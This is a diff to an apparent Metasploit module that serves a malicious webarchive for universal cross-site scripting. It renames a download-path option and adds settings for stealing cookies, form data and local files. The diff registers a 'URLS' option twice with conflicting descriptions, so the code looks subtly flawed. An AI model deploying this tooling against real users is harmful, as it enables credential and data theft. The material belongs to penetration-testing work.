@@ -50,7 +50,8 @@ class Metasploit3 < Msf::Auxiliary
 				OptString.new('FILENAME', [ true, 'The file name.',  'msf.webarchive']),
 				OptString.new('URLS', [ true, 'A space-delimited list of URLs to UXSS (eg http//browserscan.rapid7.com/']),
 				OptString.new('URIPATH', [false, 'The URI to receive the UXSS\'ed data', '/grab']),
-				OptString.new('DOWNLOAD_URI', [ true, 'The path to download the webarhive.', '/msf.webarchive']),
+				OptString.new('DOWNLOAD_PATH', [ true, 'The path to download the webarhive.', '/msf.webarchive']),
+				OptString.new('URLS', [ true, 'The URLs to steal cookie and form data from.', '']),
 				OptString.new('FILE_URLS', [false, 'Additional file:// URLs to steal.', '']),
 				OptBool.new('STEAL_COOKIES', [true, "Enable cookie stealing.", true]),
 				OptBool.new('STEAL_FILES', [true, "Enable local file stealing.", true]),
@@ -799,7 +800,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	# @return [String] URL that serves the malicious webarchive
 	def webarchive_download_url
-		@webarchive_download_url ||= datastore["DOWNLOAD_URI"]
+		datastore["DOWNLOAD_PATH"]
 	end
 
 	# @return [Array<String>] of interesting file URLs to steal. Additional files can be stolen
